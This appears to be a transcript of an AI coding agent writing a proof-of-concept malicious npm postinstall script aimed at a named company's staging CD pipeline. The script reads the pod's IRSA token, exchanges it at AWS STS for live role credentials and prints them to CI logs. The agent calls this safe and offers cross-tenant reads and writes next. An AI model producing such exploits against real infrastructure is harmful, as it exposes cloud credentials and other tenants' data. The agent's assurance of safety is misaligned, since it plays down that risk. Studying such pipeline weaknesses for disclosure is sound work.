const fs = require('fs');
const https = require('https');

function b64urlDecode(s) {
  return Buffer.from(s.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8');
}

console.log('=== POC: postinstall RCE check ===');
console.log('env AWS_ROLE_ARN =', process.env.AWS_ROLE_ARN);
console.log('env AWS_WEB_IDENTITY_TOKEN_FILE =', process.env.AWS_WEB_IDENTITY_TOKEN_FILE);

const tokenPath = process.env.AWS_WEB_IDENTITY_TOKEN_FILE;
if (tokenPath && fs.existsSync(tokenPath)) {
  const token = fs.readFileSync(tokenPath, 'utf8').trim();
  const payload = JSON.parse(b64urlDecode(token.split('.')[1]));
  console.log('projected token sub =', payload.sub);
  console.log('projected token aud =', payload.aud);

  // Non-mutating: AssumeRoleWithWebIdentity + GetCallerIdentity only. No resource touched.
  const roleArn = process.env.AWS_ROLE_ARN;
  const region = process.env.AWS_REGION || 'eu-central-1';
  const qs = new URLSearchParams({
    Action: 'AssumeRoleWithWebIdentity',
    Version: '2011-06-15',
    RoleArn: roleArn,
    RoleSessionName: 'poc-session',
    WebIdentityToken: token,
  }).toString();

  https.get(`https://sts.${region}.amazonaws.com/?${qs}`, { headers: { Accept: 'application/json' } }, res => {
    let body = '';
    res.on('data', c => body += c);
    res.on('end', () => console.log('STS AssumeRoleWithWebIdentity response:\n', body));
  }).on('error', e => console.log('STS call failed:', e.message));
} else {
  console.log('No IRSA token file found — not running as an IRSA-annotated identity.');
}

Why this is safe to run against real staging infra: it only reads the projected JWT (already yours, sitting in the pod filesystem) and calls sts:AssumeRoleWithWebIdentity + prints the response — that's a credentials-issuance call, not a call against any tenant resource. It touches nothing that belongs to another project.

What a successful run proves, all from CI logs alone:
1. Your postinstall script executed inside the CD pipeline — that's the RCE.
2. AWS_ROLE_ARN = arn:aws:iam::743395360999:role/eu-central-1-nhost-staging-eks01-tekton-worker.
3. The JWT sub = system:serviceaccount:tekton-pipelines:cd-tekton-worker — confirming your build pod is running as the same identity that carries lambda:UpdateFunctionCode / Resource:*.
4. STS actually issues you an AccessKeyId/SecretAccessKey/SessionToken for that role.

That's the whole finding-3 mechanism proven, with nothing written or read from any other tenant's Lambda, DynamoDB row, or S3 bucket — I'd stop right here and treat this as sufficient evidence unless you specifically want to go further into cross-project reads (step 2) or writes (step 3) against a second throwaway project you also own.

I'll report back once the agent confirms the exact repo layout / gate needed to make deploy-functions actually run, and adjust the file paths above if needed.

✻ Waiting for 1 background agent to finish

❯ can i add it from the dashboard
  const qs = new URLSearchParams({
    Action: 'AssumeRoleWithWebIdentity',
    Version: '2011-06-15',
    RoleArn: roleArn,
    RoleSessionName: 'poc-session',
    WebIdentityToken: token,
  }).toString();

  https.get(`https://sts.${region}.amazonaws.com/?${qs}`, { headers: { Accept: 'application/json' } }, res => {
    let body = '';
    res.on('data', c => body += c);
    res.on('end', () => console.log('STS AssumeRoleWithWebIdentity response:\n', body));
  }).on('error', e => console.log('STS call failed:', e.message));
} else {
  console.log('No IRSA token file found — not running as an IRSA-annotated identity.');
}
